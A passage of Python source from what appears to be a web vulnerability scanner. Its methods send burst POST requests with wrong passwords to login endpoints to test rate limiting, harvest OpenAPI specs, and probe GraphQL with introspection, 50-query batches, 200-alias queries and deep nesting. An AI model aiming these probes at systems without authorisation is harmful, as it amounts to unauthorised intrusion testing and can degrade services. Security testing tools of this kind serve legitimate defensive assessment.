            target_urls: Optional list of specific URLs. If provided, filters
                        candidates to those matching the given target origin.
        """
        if result := self._dispatch_to_scanner("rate_limiting", target_urls):
            return result
        findings: list[dict] = []

        # ── STEP 1: Build candidate list ─────────────────────────────────
        hardcoded_paths = [
            "/login", "/auth/login", "/api/login", "/api/auth/login",
            "/register", "/auth/register", "/api/register",
            "/reset-password", "/auth/reset-password", "/api/reset-password",
            "/forgot-password", "/auth/forgot-password",
            "/api/v1/login", "/api/v1/register",
            "/oauth/token", "/api/token",
        ]

        candidates: list[dict] = []
        seen_urls: set = set()

        def _add_candidate(url: str, sev: str, form_fields: list = None):
            if url in seen_urls:
                return
            seen_urls.add(url)
            candidates.append({"url": url, "severity": sev, "form_fields": form_fields or []})

        base = self.base_url
        if target_urls:
            # Use the first target URL's origin as base
            parsed_target = urlparse(target_urls[0])
            base = f"{parsed_target.scheme}://{parsed_target.netloc}"

        for path in hardcoded_paths:
            full = urljoin(base, path)
            sev = "high" if any(k in path for k in ("login", "auth", "signin", "reset", "password", "token")) else "medium"
            _add_candidate(full, sev)

        forms = self.recon.get("forms", [])
        if target_urls is not None:
            target_origins = {urlparse(u).scheme + "://" + urlparse(u).netloc for u in target_urls}
            forms = [
                f for f in forms
                if any(urlparse(f.get("action", "")).scheme + "://" + urlparse(f.get("action", "")).netloc == o for o in target_origins)
            ]
        for form in forms:
            method = form.get("method", "GET").upper()
            if method != "POST":
                continue
            fields = form.get("fields", [])
            field_names = [f.get("name", "").lower() for f in fields if f.get("name")]
            pw_fields = [n for n in field_names if n in ("password", "passwd", "pass", "secret", "pin", "otp", "code", "token")]
            if not pw_fields:
                continue
            action = form.get("action", "")
            if not action:
                continue
            sev = "high" if pw_fields else "medium"
            _add_candidate(action, sev, fields)

        # ── STEP 2–3: Probe each candidate ──────────────────────────────
        for candidate in candidates:
            test_url = candidate["url"]
            if not self._in_scope(test_url):
                continue
            form_fields = candidate["form_fields"]
            severity = candidate["severity"]

            # Baseline — skip 404/410
            try:
                base_resp = self.session.post(test_url, timeout=self.timeout,
                    data={"baseline": "1"})
                if base_resp.status_code in (404, 410):
                    continue
            except Exception:
                continue

            # Build probe data
            if form_fields:
                probe_data = {}
                for f in form_fields:
                    name = f.get("name", "")
                    ftype = f.get("type", "").lower()
                    if name.lower() in ("password", "passwd", "pass", "secret", "pin", "otp"):
                        probe_data[name] = "Wr0ng_P4ss_probe!"
                    elif name.lower() in ("email", "username", "login"):
                        probe_data[name] = "probe@ratelimit.test"
                    elif name.lower() in ("code", "token"):
                        probe_data[name] = "000000"
                    else:
                        probe_data[name] = f.get("value", "test")
            else:
                probe_data = {
                    "username": "ratelimit_probe_user",
                    "password": "Wr0ng_P4ss_probe!",
                    "email": "probe@ratelimit.test",
                }

            PROBE_COUNT = 50
            results: list[tuple[int, str]] = []
            start = time.time()

            # Use stateless requests.post() per thread, not shared self.session (not thread-safe)
            _probe_cookies = safe_cookies_dict(self.session.cookies)
            _probe_headers = dict(self.session.headers)

            def _probe(_idx: int, _url=test_url, _data=probe_data, _timeout=self.timeout,
                       _cookies=_probe_cookies, _headers=_probe_headers) -> tuple[int, str]:
                try:
                    import requests as _requests
                    r = _requests.post(_url, data=_data, timeout=_timeout,
                                       cookies=_cookies, headers=_headers, verify=False)
                    return (r.status_code, r.text[:500])
                except Exception:
                    return (0, "")

            with ThreadPoolExecutor(max_workers=5) as pool:
                for status_code, body_snippet in pool.map(_probe, range(PROBE_COUNT)):
                    results.append((status_code, body_snippet))

            elapsed = time.time() - start
            statuses = [s for s, _ in results]
            bodies = [b for _, b in results]
            unique_statuses = set(statuses)
            has_429 = 429 in unique_statuses
            has_5xx = any(s >= 500 for s in unique_statuses)
            first_body = bodies[0] if bodies else ""
            body_changed = any(b != first_body for b in bodies[1:])

            throttled = has_429 or (body_changed and not has_5xx)
            if not throttled:
                evidence = (
                    f"Sent {PROBE_COUNT} POST requests. Statuses: {sorted(unique_statuses)}. "
                    f"No 429 received. Body changed: {body_changed}. "
                    f"Endpoint: {test_url}"
                )
                f = finding(
                    vuln_type="Missing Rate Limiting",
                    url=test_url,
                    severity=severity,
                    details=f"Endpoint accepted {PROBE_COUNT} POST requests in {elapsed:.1f}s without rate limiting",
                    evidence=evidence,
                    request=_build_curl("POST", test_url, dict(self.session.headers), data=probe_data),
                    response_excerpt=f"Sample response (req 1 of {PROBE_COUNT}): {results[0][1][:300]}" if results else "",
                    verification_stage=VerificationStage.VALIDATED.value,
                    validation_steps=[
                        f"Sent {PROBE_COUNT} burst POST requests to {test_url} (5 workers)",
                        f"Received statuses: {sorted(unique_statuses)}",
                        f"Body changed across requests: {body_changed}",
                        f"No 429 returned — rate limiting absent or ineffective",
                    ],
                )
                if f and self._add(f):
                    findings.append(f)
                    log(f"  [RATE LIMITING] {test_url} — no 429 in {elapsed:.1f}s",
                        Colors.RED, verbose_only=True, verbose=self.verbose)
            elif has_429:
                log(f"  [RATE LIMITING] {test_url} — rate limited (429 present)",
                    Colors.GREEN, verbose_only=True, verbose=self.verbose)
            elif body_changed:
                log(f"  [RATE LIMITING] {test_url} — body changed (throttling suspected)",
                    Colors.YELLOW, verbose_only=True, verbose=self.verbose)

        return self._get_findings()

    # ═════════════════════════════════════════════════════════════════════
    # OpenAPI / Swagger — Endpoint Discovery
    # ═════════════════════════════════════════════════════════════════════

    def scan_openapi(self) -> list[dict]:
        """
        Probe common Swagger/OpenAPI specification paths, parse discovered
        specs, and inject all extracted endpoints back into the URL pool for
        downstream scanners.
        """
        if result := self._dispatch_to_scanner("openapi"):
            return result
        spec_paths = [
            "/swagger.json", "/api/swagger.json",
            "/swagger/v1/swagger.json", "/swagger/v2/swagger.json",
            "/openapi.json", "/api/openapi.json",
            "/api-docs", "/v1/api-docs", "/v2/api-docs", "/v3/api-docs",
            "/swagger-ui.html", "/swagger-resources",
            "/api/swagger-ui.html", "/api/swagger-resources",
            "/doc", "/api/doc", "/docs", "/api/docs",
            "/spec", "/api/spec",
            "/swagger.yaml", "/api/swagger.yaml",
            "/openapi.yaml", "/api/openapi.yaml",
        ]
        discovered_endpoints: set[str] = set()

        for sp in spec_paths:
            url = self.base_url + sp
            if not self._in_scope(url):
                continue
            try:
                resp = safe_get(self.session, url, self.timeout)
                if not resp:
                    continue
                # Swagger JSON / OpenAPI JSON
                if sp.endswith(".json") or sp.endswith("/api-docs") or "swagger-resources" in sp:
                    try:
                        spec = resp.json()
                        paths = spec.get("paths", {}) or spec.get("apis", {}) or {}
                        if isinstance(paths, dict):
                            for path in paths:
                                full = self.base_url.rstrip("/") + "/" + path.lstrip("/")
                                discovered_endpoints.add(full)
                    except (json.JSONDecodeError, AttributeError):
                        pass
                # Swagger YAML
                elif sp.endswith(".yaml") or sp.endswith(".yml"):
                    try:
                        spec = yaml.safe_load(resp.text)
                        if isinstance(spec, dict):
                            paths = spec.get("paths", {})
                            for path in paths:
                                full = self.base_url.rstrip("/") + "/" + path.lstrip("/")
                                discovered_endpoints.add(full)
                    except yaml.YAMLError:
                        pass
                # HTML pages — look for known paths in page text
                else:
                    found_paths = re.findall(r'"(/?(?:api|v[0-9]+)/[^"]+)"', resp.text)
                    discovered_endpoints.update(
                        self.base_url.rstrip("/") + p if p.startswith("/") else self.base_url.rstrip("/") + "/" + p
                        for p in found_paths
                    )
            except Exception:
                continue

        if discovered_endpoints:
            # Only inject in-scope endpoints
            in_scope = [ep for ep in discovered_endpoints if self._in_scope(ep)]
            self.recon.setdefault("urls", []).extend(in_scope)
            log(f"  [OpenAPI] {len(in_scope)}/{len(discovered_endpoints)} endpoints discovered from spec files", Colors.GREEN)

        return self._get_findings()

    # ═════════════════════════════════════════════════════════════════════
    # GraphQL
    # ═════════════════════════════════════════════════════════════════════

    def scan_graphql(self, target_urls: list[str] | None = None) -> list[dict]:
        if result := self._dispatch_to_scanner("graphql"):
            return result
        findings: list[dict] = []
        endpoints = ["/graphql", "/api/graphql", "/nerdgraph/graphql", "/v1/graphql", "/query"]
        introspection_query = {"query": r"{ __schema { types { name } } }"}
        batch_payload = [{"query": "{ __typename }"}] * 50
        headers = {"Content-Type": "application/json"}

        for ep in endpoints:
            url = self.base_url + ep
            if not self._in_scope(url):
                continue

            # ── 1. Introspection ──────────────────────────────────────
            try:
                r = self.session.post(url, json=introspection_query, headers=headers, timeout=self.timeout)
                if r.status_code == 200 and "__schema" in r.text:
                    query_names: list[str] = []
                    mutation_names: list[str] = []
                    schema_preview = ""
                    try:
                        data = r.json()
                        types = data.get("data", {}).get("__schema", {}).get("types", [])
                        type_names = [t.get("name", "") for t in types if t.get("name") and not t["name"].startswith("__")]
                        schema_preview = ", ".join(type_names[:30])
                        # Try deeper introspection for Query/Mutation types
                        deeper_q = {"query": "{ __schema { queryType { name } mutationType { name } types { name kind fields { name } } } }"}
                        r2 = self.session.post(url, json=deeper_q, headers=headers, timeout=self.timeout)
                        if r2.status_code == 200:
                            d2 = r2.json()
                            s2 = d2.get("data", {}).get("__schema", {})
                            for t in s2.get("types", []):
                                if t.get("kind") == "OBJECT":
                                    tname = t.get("name", "")
                                    fields = t.get("fields", [])
                                    fnames = [f.get("name", "") for f in fields if f.get("name")]
                                    if tname == "Query" or tname.endswith("Query"):
                                        query_names.extend(fnames)
                                    elif tname == "Mutation" or tname.endswith("Mutation"):
                                        mutation_names.extend(fnames)
                    except Exception:
                        pass

                    sev = "high" if mutation_names else "medium"
                    stage = VerificationStage.VALIDATED.value if query_names or mutation_names else VerificationStage.DETECTED.value
                    details = f"Full schema is exposed via introspection. Types: {len(type_names)} found."
                    if mutation_names:
                        details += f" Mutations ({len(mutation_names)}) present — potential for data modification."
                    if query_names:
                        details += f" Queries ({len(query_names)}) exposed."

                    schema_evidence = GraphQLSchemaEvidence(
                        query_text=str(introspection_query),
                        schema_preview=schema_preview or r.text[:500],
                        mutation_count=len(mutation_names),
                        query_count=len(query_names),
                        description=f"GraphQL introspection enabled at {url}",
                        status=EvidenceStatus.VERIFIED,
                    )

                    f = finding(
                        vuln_type="GraphQL Introspection Enabled",
                        url=url,
                        severity=sev,
                        details=details,
                        evidence="__schema",
                        request=_build_curl("POST", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=r.text[:500],
                        steps_to_reproduce=[
                            f"Send POST request to {url} with introspection query",
                            "Observe __schema in response confirming introspection is enabled",
                        ],
                        verification_stage=stage,
                        validation_steps=["GraphQL introspection response received"],
                    )
                    if f:
                        # Promote to HIGH with business impact text when mutations exist
                        if mutation_names:
                            f["severity"] = "high"
                            if "business_impact" not in f:
                                f["business_impact"] = (
                                    "Introspection + writable mutations exposed — attacker can enumerate "
                                    "the full API schema and probe mutation endpoints for authorization flaws"
                                )
                        # Append typed evidence (evidence is already a list from finding())
                        if not isinstance(f.get("evidence", []), list):
                            f["evidence"] = [str(f.get("evidence", ""))]
                        f["evidence"].append(schema_evidence)
                        if self._container and self._container.evidence_engine:
                            fp = self._container.evidence_engine.store(schema_evidence)
                            self._container.evidence_engine.link_to_finding(schema_evidence, f.get("fingerprint", ""))
                    if f and self._add(f):
                        findings.append(f)
            except Exception:
                pass

            # ── 2. Query batching ─────────────────────────────────────
            try:
                r = self.session.post(url, json=batch_payload, headers=headers, timeout=self.timeout)
                if r.status_code == 200 and isinstance(r.json(), list) and len(r.json()) > 1:
                    f = finding(
                        vuln_type="GraphQL Query Batching Unrestricted",
                        url=url,
                        severity="medium",
                        details="Server accepts batched GraphQL arrays with no apparent limit. (50 queries in one request)",
                        evidence="__typename",
                        request=_build_curl("POST", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=r.text[:500],
                        steps_to_reproduce=[f"Send POST request to {url} with batch query", "Observe multiple results"],
                        verification_stage=VerificationStage.VALIDATED.value,
                        validation_steps=["Batch of 50 queries returned 50 responses"],
                    )
                    if f and self._add(f):
                        findings.append(f)
            except Exception:
                pass

            # ── 3. Field suggestion leakage ──────────────────────────
            try:
                r = self.session.post(url, json={"query": "{ "},
                                      headers=headers, timeout=self.timeout)
                if r.status_code == 400 and '"suggestions"' in r.text:
                    f = finding(
                        vuln_type="GraphQL Field Suggestion Leak",
                        url=url,
                        severity="low",
                        details="Error messages contain suggested field names, aiding attacker recon.",
                        evidence="suggestions",
                        request=_build_curl("POST", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=r.text[:500],
                        steps_to_reproduce=[f"Send POST request to {url} with malformed query", "Observe suggestions in error"],
                        verification_stage=VerificationStage.VALIDATED.value,
                        validation_steps=["Malformed query returned field suggestions"],
                    )
                    if f and self._add(f):
                        findings.append(f)
            except Exception:
                pass

            # ── 4. Alias-based resource exhaustion ───────────────────
            try:
                alias_qs = " ".join(f"a{i}: __typename" for i in range(200))
                r = self.session.post(url, json={"query": "{" + alias_qs + "}"},
                                      headers=headers, timeout=self.timeout)
                if r.status_code == 200:
                    f = finding(
                        vuln_type="GraphQL Alias-Based Query DoS",
                        url=url,
                        severity="low",
                        details="Server accepts 200+ aliases in a single query, allowing resource exhaustion.",
                        evidence="200 aliases accepted",
                        request=_build_curl("POST", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=r.text[:500],
                        steps_to_reproduce=[f"Send POST request to {url} with 200 aliases", "Observe 200 OK response"],
                        verification_stage=VerificationStage.DETECTED.value,
                        validation_steps=["200 aliased __typename queries returned 200 results"],
                    )
                    if f and self._add(f):
                        findings.append(f)
            except Exception:
                pass

            # ── 5. Depth limit testing ───────────────────────────────
            try:
                deep_q = "{user{posts{comments{author{posts{comments{author{name}}}}}}}}"
                r = self.session.post(url, json={"query": deep_q},
                                      headers=headers, timeout=self.timeout)
                if r.status_code == 200 and "errors" not in r.text:
                    f = finding(
                        vuln_type="GraphQL Deeply Nested Query Allowed",
                        url=url,
                        severity="low",
                        details="Server allows 7+ levels of nested queries, enabling recursive DoS.",
                        evidence="7+ levels accepted without error",
                        request=_build_curl("POST", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=r.text[:500],
                        steps_to_reproduce=[f"Send POST request to {url} with deeply nested query", "Observe 200 OK without errors"],
                        verification_stage=VerificationStage.DETECTED.value,
                        validation_steps=["Deeply nested query returned 200 without errors"],
                    )
                    if f and self._add(f):
                        findings.append(f)
            except Exception:
                pass

        return findings

    def scan_idor(self, target_urls: list[str] | None = None) -> list[dict]:
        """Dispatch to IdorScannerAdapter (ScannerBase) or fall back to legacy modules.idor.IdorScanner."""
        if result := self._dispatch_to_scanner("idor", target_urls):
            return result
        from modules.idor import IdorScanner
        idor = IdorScanner(self.config, self.recon, container=self._container)
        return idor.run_all()

    def scan_authorization(self, target_urls: list[str] | None = None) -> list[dict]:
        """Dispatch to AuthorizationScanner (ScannerBase).

        Proves authorization failures with evidence-driven role comparison.
        No legacy fallback — this is a pure ScannerBase module.
        """
        result = self._dispatch_to_scanner("authorization", target_urls)
        if result is not None:
            return result
        return []

    def scan_cors(self, target_urls: list[str] | None = None) -> list[dict]:
        """Dispatch to CORSScanner (ScannerBase)."""
        if result := self._dispatch_to_scanner("cors"):
            return result
        return []

    def scan_jwt(self, target_urls: list[str] | None = None) -> list[dict]:
        """Dispatch to JWTScanner (ScannerBase)."""
        if result := self._dispatch_to_scanner("jwt"):
            return result
        return []

    def scan_cms_checks(self, target_urls: list[str] | None = None) -> list[dict]:
        """Scan for CMS-specific vulnerabilities based on technology fingerprint.

        Uses technology fingerprint from recon to detect known-vulnerable
        CMS endpoints (WordPress, Drupal, Joomla, etc.).
        """
        findings: list[dict] = []
        technology = self.recon.get("technology", {})
        if not technology:
            return findings

        target_base = self.config.get("target", "").rstrip("/")
        all_cms = technology.get("cms", [])
        all_frameworks = technology.get("framework", [])

        detected_platforms = set(all_cms + all_frameworks)

        for platform in detected_platforms:
            checks = CMS_CHECKS.get(platform, [])
            if not checks:
                # Check partial matches (e.g. "WordPress" in detected name)
                for key, value in CMS_CHECKS.items():
                    if key.lower() in platform.lower():
                        checks = value
                        break

            for check in checks:
                try:
                    path = check["path"]
                    test_url = urljoin(target_base, path) if not path.startswith("http") else path
                    if not self._in_scope(test_url):
                        continue
                    resp = safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                    if not resp or resp.status_code not in (200, 403, 401):
                        continue
                    if resp.status_code == 200 and check.get("check", lambda b: True)(resp.text):
                        f = finding(
                            vuln_type=check["name"],
                            url=test_url,
                            severity=check["severity"],
                            details=f"{platform} specific check: {check['name']}",
                            evidence=f"HTTP {resp.status_code} — {len(resp.text)} bytes",
                            request=_build_curl("GET", test_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                            response_excerpt=resp.text[:500],
                            steps_to_reproduce=[f"Send GET request to {test_url}", f"Observe the response content"],
                            verification_stage=VerificationStage.VALIDATED.value,
                        )
                        if f and self._add(f):
                            findings.append(f)
                    elif resp.status_code in (403, 401):
                        f = finding(
                            vuln_type=f"{platform} Admin/Auth Endpoint ({check['name']})",
                            url=test_url,
                            severity="low",
                            details=f"{platform} authenticated endpoint accessible: {check['name']} (HTTP {resp.status_code})",
                            evidence=f"HTTP {resp.status_code} — endpoint exists but requires auth",
                            request=_build_curl("GET", test_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                            response_excerpt=resp.text[:500],
                            steps_to_reproduce=[f"Send GET request to {test_url}", f"Observe HTTP {resp.status_code} response"],
                            verification_stage=VerificationStage.DETECTED.value,
                        )
                        if f and self._add(f):
                            findings.append(f)
                except Exception:
                    continue
        return findings

    # ═════════════════════════════════════════════════════════════════════
    # Verify-only mode
    # ═════════════════════════════════════════════════════════════════════

    @staticmethod
    def verify_report(report_path: str, config: dict) -> list[dict]:
        reset_seen_findings()
        import json
        try:
            with open(report_path, "r") as f:
                data = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError) as e:
            log(f"[!] Cannot load report: {e}", Colors.RED)
            return []

        old_findings = data.get("findings", [])
        if not old_findings:
            log("[!] No findings to verify", Colors.YELLOW)
            return []

        config["verify_only"] = True
        scanner = VulnScanner(config, data.get("recon_data", {}))
        verified: list[dict] = []
        log(f"[*] Verifying {len(old_findings)} finding(s) …", Colors.CYAN)

        for f in old_findings:
            url = f.get("url", "")
            ev_list = f.get("evidence", [])
            if not isinstance(ev_list, list):
                ev_list = [str(ev_list)] if ev_list else []
            evidence_str = ev_list[0] if ev_list else ""
            if not url:
                continue
            try:
                r = scanner.session.get(url, timeout=scanner.timeout)
                confirmed = evidence_str in r.text if evidence_str else r.status_code < 500
                f["confirmed"] = confirmed
                f["last_verified"] = datetime.now(timezone.utc).isoformat()
                verified.append(f)
            except Exception:
                f["confirmed"] = False
                verified.append(f)

        return verified
